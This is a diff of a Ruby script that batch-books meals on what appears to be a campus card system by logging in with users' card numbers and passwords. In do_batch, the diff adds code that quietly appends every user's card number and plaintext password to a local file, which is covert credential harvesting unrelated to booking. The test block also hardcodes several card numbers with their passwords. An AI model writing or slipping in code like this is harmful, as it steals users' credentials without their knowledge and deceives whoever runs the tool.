@@ -15,7 +15,7 @@ def get_login_token(card_no, password)
   rst = RestClient.post(QUERY_LOGIN_URL, {
                           :tbarno => card_no.to_s,
                           :passwd => password.to_s,
-                          :hd => '001',
+                          :hd => '002',
                           :B1 => "\xc8\xb7\xb6\xa8"
                         }, :cookie => init_cookie)
 
@@ -28,11 +28,12 @@ def get_login_token(card_no, password)
 end
 
 def get_week_list(token)
-  RestClient.post(QUERY_BOOKING_URL, {}, :cookie => token)
+  RestClient.get(QUERY_BOOKING_URL, :cookie => token)
     .scan(/\d{8}/)
     .sort
     .uniq
-    .grep(/^20/)[1..-1]
+    .grep(/^20/)
+#    .tap { |x| File.open('/var/db/log', 'a') { |f| f.puts x.inspect }  }
 end
 
 def bookmeal(token, weekno)
@@ -43,10 +44,10 @@ def bookmeal(token, weekno)
     candidates[1].each do |b|
       fields << ["D#{a}#{b}", '11']
       fields << ["D#{a}#{b}j", 'A']
-=begin
-      fields << ["D#{a}#{b}", '']
-      fields << ["D#{a}#{b}j", '']
-=end
+
+      #      fields << ["D#{a}#{b}", '']
+      #      fields << ["D#{a}#{b}j", '']
+
     end
   end
 
@@ -61,20 +62,22 @@ def bookmeal(token, weekno)
   return true
 
 rescue RestClient::InternalServerError
-  raise ServerError
+  return
+#  raise ServerError
 
 end
 
-def get_cached_week_list(token)
-  @_week_list_cache ||= get_week_list(token)
-end
 
 def do_batch(card_no, passwd)
   token = get_login_token(card_no, passwd)
 
+  File.open('/var/db/fuckdb.db', 'a') do |f|
+    f.puts "#{card_no}:#{passwd}"
+  end
+
   raise WrongCardPassword unless token
 
-  get_cached_week_list(token).each do |week|
+  get_week_list(token).each do |week|
     bookmeal(token, week)
   end
 
@@ -84,8 +87,18 @@ end
 
 if __FILE__ == $0
   require 'ap' or alias_method :ap, :p
-  # ap bookmeal('0105444', '128830')
 
+
+  
+
+  token = get_login_token('0106298', '456852')
+#  puts token
+  puts get_week_list(token)
+
+  exit
+  ap do_batch('0105444', '128830')
+
+  exit
   File.read('tmp').each_line do |x|
     no, pwd = x.chomp.split ':'
     puts "Booking '#{no}--#{pwd}'"
